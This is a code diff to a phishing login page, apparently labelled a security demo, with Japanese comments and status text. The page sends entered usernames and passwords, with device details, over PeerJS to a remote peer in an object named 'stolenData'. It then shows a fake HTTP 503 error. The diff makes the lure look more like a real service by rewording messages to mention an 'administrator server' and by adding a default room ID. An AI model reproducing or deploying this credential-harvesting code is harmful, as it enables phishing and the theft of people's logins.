@@ -38,11 +38,11 @@
     </form>
     <!-- 接続状態の表示用テキスト -->
     <div style="margin-top: 12px; font-size: 12px; color: #ffaa00; text-align: center;" id="conn-status">
-      ⏳ PC管理者との接続を確立しています...
+      ⏳ 管理者サーバーとの接続を確立しています...
     </div>
   </div>
 
-  <!-- ⚠️ エラー画面（ログイン後にスマホで表示され、そのまま留まる） -->
+  <!-- ⚠️ エラー画面 -->
   <div class="login-container hidden" id="error-box">
     <div class="error-icon">⚠️</div>
     <h3 style="color: #d9534f;">HTTP 503 Service Unavailable</h3>
@@ -51,12 +51,12 @@
 
   <script>
     const urlParams = new URLSearchParams(window.location.search);
-    const roomId = urlParams.get('room'); // PCのルームIDを取得
+    // URLからルームIDを取得（指定がない場合はデフォルトで "my-sec-demo-room" を使用）
+    const roomId = urlParams.get('room') || 'my-sec-demo-room';
 
     const loginBtn = document.getElementById('login-btn');
     const connStatus = document.getElementById('conn-status');
 
-    // 接続スピードと安定性を高めるため、Google等のSTUNサーバーを指定
     let peer = new Peer({
       config: {
         'iceServers': [
@@ -68,30 +68,25 @@
     let conn = null;
 
     peer.on('open', () => {
-      if (roomId) {
-        connStatus.innerText = "⚡ PCへ高速接続中...";
-        // PC（ホスト）へ接続を要求
-        conn = peer.connect("sec-demo-" + roomId, { reliable: true });
+      connStatus.innerText = "⚡ サーバーへ高速接続中...";
+      // 指定されたルームIDのPCへ接続
+      conn = peer.connect("sec-demo-" + roomId, { reliable: true });
+      
+      conn.on('open', () => {
+        // 🔗 接続成功！ボタンを押せるようにする
+        loginBtn.disabled = false;
+        loginBtn.style.opacity = "1";
+        loginBtn.style.cursor = "pointer";
+        loginBtn.innerText = "ログイン";
         
-        conn.on('open', () => {
-          // 🔗 接続成功！ボタンを押せるように解放する
-          loginBtn.disabled = false;
-          loginBtn.style.opacity = "1";
-          loginBtn.style.cursor = "pointer";
-          loginBtn.innerText = "ログイン";
-          
-          connStatus.innerText = "🟢 接続完了（リアルタイム通信確立）";
-          connStatus.style.color = "#2ed573";
-        });
+        connStatus.innerText = "🟢 接続完了（リアルタイム通信確立）";
+        connStatus.style.color = "#2ed573";
+      });
 
-        conn.on('error', (err) => {
-          connStatus.innerText = "❌ 接続エラー（再読み込みしてください）";
-          connStatus.style.color = "#ff4757";
-        });
-      } else {
-        connStatus.innerText = "⚠️ 接続先IDがありません（QRコードからアクセスしてください）";
+      conn.on('error', (err) => {
+        connStatus.innerText = "❌ 接続エラー（再読み込みしてください）";
         connStatus.style.color = "#ff4757";
-      }
+      });
     });
 
     function getDeviceInfo() {
@@ -114,15 +109,14 @@
 
       const stolenData = { time, device, username, password };
 
-      // PC（管理者画面）へリアルタイムでデータを送信！
       if (conn && conn.open) {
         conn.send(stolenData);
       } else {
-        alert("PCとの接続が切断されています。");
+        alert("管理者サーバーとの接続が切断されています。");
         return;
       }
 
-      // スマホ側はエラー画面を表示してその場でストップ
+      // スマホ側はエラー画面を表示してストップ
       document.getElementById('login-box').classList.add('hidden');
       document.getElementById('error-box').classList.remove('hidden');
     });
